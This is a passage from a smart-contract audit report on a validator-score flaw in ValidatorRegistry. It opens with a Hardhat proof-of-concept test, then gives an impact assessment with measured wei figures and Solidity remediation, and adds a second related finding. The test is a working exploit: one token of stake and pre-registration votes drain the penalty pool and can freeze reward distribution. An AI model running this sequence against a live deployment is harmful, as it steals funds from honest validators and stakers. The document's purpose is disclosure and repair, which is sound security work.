    // validator share (stakerShares 5000 => 50%) + own staker share (1/61 votes)
    ((participation * 5000n) / 10000n) + ((((participation * 1n) / 61n) * 5000n) / 10000n);

  async function runScenario(doPreVotes) {
    const { virtualToken, agentNft, veToken, dao, rewards, deployer, founder, stakerA, stakerK, attacker } =
      await loadFixture(setup);

    // 1. Honest genesis validators (base score 0), never vote afterwards
    await stake(virtualToken, veToken, stakerA, V("60"), stakerA, stakerA);
    await stake(virtualToken, veToken, stakerK, V("30"), stakerK, stakerK);

    // 2. Two proposals exist (totalProposals = 2)
    const p1 = await propose(dao, founder, "p1");
    const p2 = await propose(dao, founder, "p2");
    expect(await agentNft.totalProposals(1)).to.equal(2n);

    // 3. THE TRIGGER: attacker pre-votes both proposals with zero weight
    if (doPreVotes) {
      await dao.connect(attacker).castVote(p1, 1);
      await dao.connect(attacker).castVote(p2, 1);
      expect(await dao.scoreOf(attacker.address)).to.equal(2n);
    }

    // 4. Attacker registers with a single token (production path:
    //    stake -> addValidator -> _initValidatorScore => base = 2)
    await stake(virtualToken, veToken, attacker, V("1"), attacker, attacker);
    expect(await agentNft.isValidator(1, attacker.address)).to.equal(true);
    expect(await veToken.balanceOf(attacker.address)).to.equal(V("1")); // ALL skin in the game

    // 5. Honest stakerA re-delegates to the attacker (rational: stakers get
    //    50% of the delegatee's group rewards; the attacker shows 4/2 = 200%
    //    "uptime"). Attacker's delegated votes: 60 + 1 = 61 of 91.
    await veToken.connect(stakerA).delegate(attacker.address);
    expect(await veToken.getVotes(attacker.address)).to.equal(V("61"));

    // 6. totalProposals catches up to the inflated score (4)
    await propose(dao, founder, "p3");
    await propose(dao, founder, "p4");
    expect(await agentNft.totalProposals(1)).to.equal(4n);
    expect(await agentNft.validatorScore(1, attacker.address)).to.equal(doPreVotes ? 4n : 2n);

    // 7. Two committed reward rounds; the attacker does NOTHING in between
    for (let round = 0; round < 2; round++) {
      await virtualToken.mint(deployer.address, REWARD_SIZE);
      await virtualToken.approve(rewards.target, REWARD_SIZE);
      await rewards.distributeRewards(REWARD_SIZE);
      await mine(1);
      await expect(rewards.distributeRewardsForAgents(round, [1])).to.not.be.reverted;
    }

    // 8. Claims
    const claimableAtt = await rewards.getTotalClaimableRewards(attacker.address, [1], []);
    const balBefore = await virtualToken.balanceOf(attacker.address);
    await rewards.connect(attacker).claimAllRewards([1], []);
    const balAfter = await virtualToken.balanceOf(attacker.address);

    return {
      virtualToken,
      rewards,
      stakerK,
      claimableAtt,
      attBalanceDelta: balAfter - balBefore,
    };
  }

  it("E: 1-token attacker with third-party delegation pays zero penalties on every committed round while honest validators fund the pool", async function () {
    const { virtualToken, rewards, stakerK, claimableAtt, attBalanceDelta } = await runScenario(true);

    // Penalty pool after 2 rounds holds ONLY honest stakerK's penalties:
    // the attacker's group (61/91 of all stake) evaded its entire penalty.
    expect(await rewards.validatorPoolRewards()).to.equal(vrK * 2n);

    // Honest never-voting validator gets nothing at all
    expect(await rewards.getTotalClaimableRewards(stakerK.address, [1], [])).to.equal(0n);

    // Attacker extracted their full vr twice on 1 token of stake
    expect(claimableAtt).to.equal(claimableFor(partAttAttack) * 2n);
    expect(attBalanceDelta).to.equal(claimableFor(partAttAttack) * 2n);
    expect(attBalanceDelta).to.be.gt(V("500000")); // > 500k extracted with 1 token staked

    console.log(
      "  [attack]   pool after 2 rounds:",
      (vrK * 2n).toString(),
      "wei (attacker penalty evaded:",
      ((vrAtt - partAttCtrl) * 2n).toString(),
      "wei); attacker claimed:",
      attBalanceDelta.toString(),
      "wei on 1 token staked"
    );
  });

  // R3 negative control: identical sequence, trigger absent (no
  // pre-registration votes) => attacker pays their fair 50% penalty per
  // round and the pool accrues it.
  it("E-negative-control: identical flow without pre-registration votes accrues the attacker's fair penalty into the pool", async function () {
    const { rewards, claimableAtt, attBalanceDelta } = await runScenario(false);

    // Pool gets stakerK's penalty PLUS the attacker's fair penalty each round
    expect(await rewards.validatorPoolRewards()).to.equal((vrK + (vrAtt - partAttCtrl)) * 2n);

    expect(claimableAtt).to.equal(claimableFor(partAttCtrl) * 2n);
    expect(attBalanceDelta).to.equal(claimableFor(partAttCtrl) * 2n);

    console.log(
      "  [control]  pool after 2 rounds:",
      ((vrK + (vrAtt - partAttCtrl)) * 2n).toString(),
      "wei; attacker claimed:",
      attBalanceDelta.toString(),
      "wei"
    );
  });
});
```

### Impact assessment

All numbers below are measured by the test above, in exact wei where shown (1 VIRTUAL = 1e18 wei).

**Escalated case (test E) — repeated, unbounded theft at 1-token cost.** Across two committed rounds of 1,000,000 VIRTUAL each (2,000,000 VIRTUAL total; 800,000 VIRTUAL validator amount per round), an attacker holding exactly **1 VIRTUAL of stake** (1.1% of the 91 staked) and casting two free, zero-weight votes:

- claimed **545,054.945054945054945052 VIRTUAL** (545054945054945054945052 wei), i.e. 27.3% of everything committed, versus **272,527.472527472527472524 VIRTUAL** (272527472527472527472524 wei) in the byte-identical negative control — exactly **2x** entitlement;
- evaded **536,263.736263736263736264 VIRTUAL** (536263736263736263736264 wei) of missed-vote penalties: the penalty pool (`validatorPoolRewards`, funded by honest validators' penalties and gov-withdrawable) ended at **527,472.527472527472527472 VIRTUAL** instead of the control's **1,063,736.263736263736263736 VIRTUAL** — short by the same 536,263.736 VIRTUAL;
- paid **0%** of the participation-based penalty on their 61/91 vote-weight share, while the honest never-voting validator (30 VIRTUAL staked) received claimable **0** — their penalties alone funded the pool.

The loss recurs on **every** committed round (the attacker performs no action between rounds in the test) and scales with the reward size and delegated stake, not with the attacker's capital; only two rounds were measured because the pattern is deterministic.

**Capital variant (test C, 40-token attacker, no delegation):** 640,000e18 wei claimed over two rounds vs 320,000e18 in the control; penalty pool 960,000e18 vs 1,280,000e18.

**Base case (tests B and D) — temporarily stranded rounds:** with the inflated score above `totalProposals`, `distributeRewardsForAgents` reverts with panic 0x11 and the full **1,000,000e18 wei** round is frozen with claimable 0 for every validator and staker of the agent (control pays out 241,584.16e18 wei to the same validator). The freeze clears when new proposals raise `totalProposals` to the inflated score, and the same round then pays the inflated validator **320,000e18 vs the fair 160,000e18** (test D) — the stranded-round DoS is the first stage of the same theft, bounded below by the round size and above by nothing.

**Data-integrity case (test A):** `getPastValidatorScore` for an unchanged past block changed from 0 to 3 (where `totalProposals` at that block was 1) after a later `addValidator` — any consumer of historical scores reads retroactively fabricated participation.

**Who loses:** the validator penalty pool and its beneficiaries (honest validators whose missed-vote penalties sole-handedly fund it), stakers and validators of rounds frozen at panic 0x11, and ultimately the protocol's reward budget, which pays out 100% participation rates fabricated from weightless pre-registration votes.

### Remediation

Fix both halves of the defect in `ValidatorRegistry`: subtract the DAO score the account has already accumulated when initializing the base score (removes the double-count that drives the theft and the underflow), and checkpoint the base score by block number (removes the retroactive historical inflation and pins the base to the registration timepoint):

```solidity
    using Checkpoints for Checkpoints.Trace208;

    mapping(address account => mapping(uint256 virtualId => Checkpoints.Trace208 scoreCheckpoints)) private _baseValidatorScoreCheckpoints;

    function _initValidatorScore(uint256 virtualId, address validator) internal {
        uint256 maxScore = _getMaxScore(virtualId);
        uint256 currentScore = _getScoreOf(virtualId, validator);
        uint256 baseScore = maxScore > currentScore ? maxScore - currentScore : 0;
        _baseValidatorScoreCheckpoints[validator][virtualId].push(
            SafeCast.toUint48(block.number),
            SafeCast.toUint208(baseScore)
        );
    }

    function validatorScore(uint256 virtualId, address validator) public view virtual returns (uint256) {
        if (!isValidator(virtualId, validator)) {
            return 0;
        }
        return _baseValidatorScoreCheckpoints[validator][virtualId].latest() + _getScoreOf(virtualId, validator);
    }

    function getPastValidatorScore(
        uint256 virtualId,
        address validator,
        uint256 timepoint
    ) public view virtual returns (uint256) {
        uint256 baseScore = _baseValidatorScoreCheckpoints[validator][virtualId].upperLookupRecent(
            SafeCast.toUint48(timepoint)
        );
        if (baseScore == 0 && !isValidator(virtualId, validator)) {
            return 0;
        }
        return baseScore + _getPastScore(virtualId, validator, timepoint);
    }
```

With the subtraction in place, the PoC's attacker registers with base score `maxScore - currentScore = 0` and `validatorScore` stays at the account's true DAO score, so `participationReward ≤ validatorRewards` always holds (no panic 0x11) and the 100%-participation overpayment disappears; with the checkpoint in place, past-block queries return the score that existed at the queried block (test A's 0 → 3 inflation becomes a stable 0).

## Finding 12: Unadjusted Base Score Initialization in `ValidatorRegistry._initValidatorScore` Allows `validatorScore` to Exceed `totalProposals`

### Synopsis

In `ValidatorRegistry`, `_initValidatorScore` sets a new validator's `_baseValidatorScore` to `_getMaxScore(virtualId)` (`totalProposals`) without deducting prior voting scores or capping the total score. Consequently, `validatorScore` and `getPastValidatorScore` can exceed `totalProposals`, inflating participation rewards and causing reward distribution in `AgentRewardV2` to revert due to arithmetic underflow.

### Technical details

The `ValidatorRegistry` contract tracks a validator's proposal participation uptime by combining a baseline score assigned at validator registration with the score accrued from voting in `AgentDAO`:

```solidity
function _initValidatorScore(uint256 virtualId, address validator) internal {
    _baseValidatorScore[validator][virtualId] = _getMaxScore(virtualId);
}

function validatorScore(uint256 virtualId, address validator) public view virtual returns (uint256) {
    return _baseValidatorScore[validator][virtualId] + _getScoreOf(virtualId, validator);
}

function getPastValidatorScore(
    uint256 virtualId,
    address validator,
    uint256 timepoint
) public view virtual returns (uint256) {
    return _baseValidatorScore[validator][virtualId] + _getPastScore(virtualId, validator, timepoint);
}
```

In `AgentNftV2`, `ValidatorRegistry` is initialized with:
- `_getScoreOf` -> `_validatorScoreOf`, which returns `IAgentDAO(info.dao).scoreOf(account)`
- `_getMaxScore` -> `totalProposals`, which returns `IAgentDAO(info.dao).proposalCount()`
- `_getPastScore` -> `_getPastValidatorScore`, which returns `IAgentDAO(info.dao).getPastScore(account, timepoint)`

The intended design is that a newly registered validator starts with 100% participation for all proposals prior to their registration (by giving them a base credit equal to the number of existing proposals at enrollment time), and subsequent proposals require actual voting in `AgentDAO` to maintain a 100% score (`validatorScore / totalProposals == 1`).

However, this composition of `_baseValidatorScore` and `_getScoreOf` / `_getPastScore` is flawed in three ways:

1. **Pre-enrollment voting is double-counted:** `AgentDAO` allows any account to cast votes on proposals without being registered as a validator in `ValidatorRegistry`, incrementing `dao.scoreOf(account)`. Because `AgentNftV2.addValidator(virtualId, validator)` is a permissionless `public` function (and is also triggered when staking and delegating `veToken`), an account can vote on $k$ proposals first (accruing `_getScoreOf(virtualId, validator) = k`) and register as a validator afterward when `totalProposals` is $N$. `_initValidatorScore` sets `_baseValidatorScore[validator][virtualId] = N`, resulting in:
   $$\text{validatorScore} = N + k > N = \text{totalProposals}$$

2. **Active proposals at enrollment time are double-counted:** In `GovernorStorageUpgradeable._propose`, `_proposalIds.push(proposalId)` is executed as soon as a proposal is created, immediately incrementing `proposalCount()` (`_getMaxScore(virtualId)`). If a validator is registered via `addValidator` while one or more proposals are still `Pending` or `Active`, `_baseValidatorScore` already includes those proposals. When the validator subsequently casts a vote on those active proposals, `_getScoreOf(virtualId, validator)` increases by 1 per proposal while `totalProposals` remains unchanged, again pushing `validatorScore` above `totalProposals`.

3. **Historical score distortion in `getPastValidatorScore`:** `_baseValidatorScore` is not checkpointed and stores the value of `_getMaxScore(virtualId)` at the moment `_initValidatorScore` was called. Adding this current `_baseValidatorScore` to `_getPastScore(virtualId, validator, timepoint)` produces a score that exceeds the historical proposal count at `timepoint` and double-counts any votes cast before `_initValidatorScore` was executed.

In `AgentRewardV2._distributeValidatorRewards`, validator rewards are computed as:

```solidity
uint256 participationReward = totalProposals == 0
    ? 0
    : (validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals;
_validatorRewards[validator][rewardId] = participationReward;

validatorPoolRewards += validatorRewards - participationReward;
```

When `nft.validatorScore(virtualId, validator) > totalProposals` (and `validatorRewards > 0`), `participationReward` exceeds `validatorRewards`. The subtraction `validatorRewards - participationReward` at line 248 underflows under Solidity 0.8 checked arithmetic, causing `distributeRewardsForAgents` to revert and permanently DoS reward distribution for the affected `virtualId`. Furthermore, if a validator later misses proposals so that `validatorScore` drops back to `<= totalProposals`, the inflated `_baseValidatorScore` masks their missed votes and allows them to claim full participation rewards despite non-participation.

### Assumptions and preconditions

1. An agent (`virtualId`) has been minted and initialized with a valid `AgentDAO` and `veToken`.
2. At least one governance proposal is created in `AgentDAO` (`totalProposals(virtualId) >= 1`).
3. An account either casts a vote on a proposal before being registered via `addValidator`, or is registered via `addValidator` while a proposal is active and then votes on that proposal.

### Proof of concept

1. An agent with `virtualId = 1` is created. Initially, `totalProposals(1) == 0`.
2. Proposal 1 is created in `AgentDAO`. `GovernorStorageUpgradeable._propose` pushes the proposal ID to `_proposalIds`, so `totalProposals(1)` (`_getMaxScore(1)`) becomes `1`.
3. Address `V` (not yet registered in `ValidatorRegistry`, or registering now while Proposal 1 is active) participates as follows:
   - **Scenario A (Vote before registration):** `V` casts a valid vote on Proposal 1 in `AgentDAO`. `_getScoreOf(1, V)` becomes `1` while `_baseValidatorScore[V][1]` is `0`. Next, `agentNft.addValidator(1, V)` is called (either directly or automatically via staking/delegation). `_initValidatorScore(1, V)` sets `_baseValidatorScore[V][1] = _getMaxScore(1) = 1`.
   - **Scenario B (Register during active proposal, then vote):** `agentNft.addValidator(1, V)` is called while Proposal 1 is still active. `_initValidatorScore(1, V)` sets `_baseValidatorScore[V][1] = _getMaxScore(1) = 1`. `V` then casts a vote on Proposal 1, increasing `_getScoreOf(1, V)` to `1`.
4. Querying `agentNft.validatorScore(1, V)` now returns:
   $$\text{\_baseValidatorScore}[V][1] + \text{\_getScoreOf}(1, V) = 1 + 1 = 2$$
   while `agentNft.totalProposals(1)` is `1` (as also seen in `test/virtualGenesis.js` where `newScore` becomes `2n` with only 1 proposal).
5. When governance calls `AgentRewardV2.distributeRewardsForAgents` for `virtualId = 1` (assuming `V` has non-zero delegated `votes`):
   - `validatorRewards = (amount * votes) / totalStaked > 0`
   - `participationReward = (validatorRewards * 2) / 1 = 2 * validatorRewards`
   - Line 248 executes `validatorPoolRewards += validatorRewards - participationReward`, which attempts `validatorRewards - 2 * validatorRewards` and reverts with panic `0x11` (arithmetic underflow).

### Impact assessment

- **Severity:** High
- **Direct Technical Effect:** `validatorScore` and `getPastValidatorScore` violate the upper-bound invariant `score <= totalProposals`.
- **Business & Protocol Impact:**
  1. **Denial of Service on Reward Distribution:** Any validator with `validatorScore > totalProposals` and non-zero delegated voting power causes `AgentRewardV2._distributeValidatorRewards` to revert with an arithmetic underflow, blocking reward distribution for that agent. Because `AgentNftV2.addValidator` is permissionless, a malicious user can intentionally trigger this state for any agent by voting on a proposal, acquiring a minimal amount of delegated `veToken`, and calling `addValidator`.
  2. **Distorted Participation Accounting & Unfair Rewards:** Validators who accrue extra score above `totalProposals` build a buffer that offsets future missed proposals, allowing them to collect 100% of `validatorRewards` (and depriving `validatorPoolRewards` of penalty amounts) even when they fail to vote on subsequent proposals.

### Remediation

In `ValidatorRegistry._initValidatorScore`, deduct the validator's already-accrued score `_getScoreOf(virtualId, validator)` from `_getMaxScore(virtualId)` when initializing `_baseValidatorScore`, and cap the returned score in `validatorScore` and `getPastValidatorScore` at `_getMaxScore(virtualId)`.

```solidity
    function _initValidatorScore(uint256 virtualId, address validator) internal {
        uint256 maxScore = _getMaxScore(virtualId);
        uint256 currentScore = _getScoreOf(virtualId, validator);
        _baseValidatorScore[validator][virtualId] = maxScore > currentScore ? maxScore - currentScore : 0;
    }

    function validatorScore(uint256 virtualId, address validator) public view virtual returns (uint256) {
        uint256 score = _baseValidatorScore[validator][virtualId] + _getScoreOf(virtualId, validator);
        uint256 maxScore = _getMaxScore(virtualId);
        return score > maxScore ? maxScore : score;
    }

    function getPastValidatorScore(
        uint256 virtualId,
        address validator,
        uint256 timepoint
    ) public view virtual returns (uint256) {
        uint256 score = _baseValidatorScore[validator][virtualId] + _getPastScore(virtualId, validator, timepoint);
        uint256 maxScore = _getMaxScore(virtualId);
        return score > maxScore ? maxScore : score;
    }
```
